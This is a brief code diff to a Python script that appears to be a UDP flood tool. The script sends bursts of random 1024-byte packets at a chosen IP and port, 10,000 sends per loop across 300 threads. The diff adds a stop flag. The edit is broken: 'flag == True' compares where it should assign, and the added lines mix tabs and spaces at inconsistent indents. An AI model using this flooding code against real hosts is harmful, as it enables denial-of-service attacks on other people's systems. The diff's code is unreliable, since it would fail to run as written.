@@ -9,6 +9,7 @@ port = 0
 choice = ""
 times = 10000
 threads = 300
+flag == True
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -18,7 +19,11 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+        if flag == False:
+          return
+			  print(i +" Sent!!!")
+
+      
 		except:
 			print("[!] Error!!!")
 
